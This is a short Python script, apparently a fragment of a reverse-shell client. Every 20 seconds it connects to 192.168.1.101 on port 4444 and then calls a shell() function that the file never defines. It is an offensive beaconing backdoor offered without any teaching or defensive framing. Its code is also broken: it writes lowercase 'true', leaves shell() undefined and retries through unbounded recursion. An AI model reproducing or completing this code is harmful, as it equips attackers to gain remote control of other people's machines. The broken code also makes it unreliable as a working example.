import socket
import time

def connection():
	while true:
		time.sleep(20)
		try:
			s.connect(('192.168.1.101', 4444))
			shell()
			s.close()
		except:
			connection()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
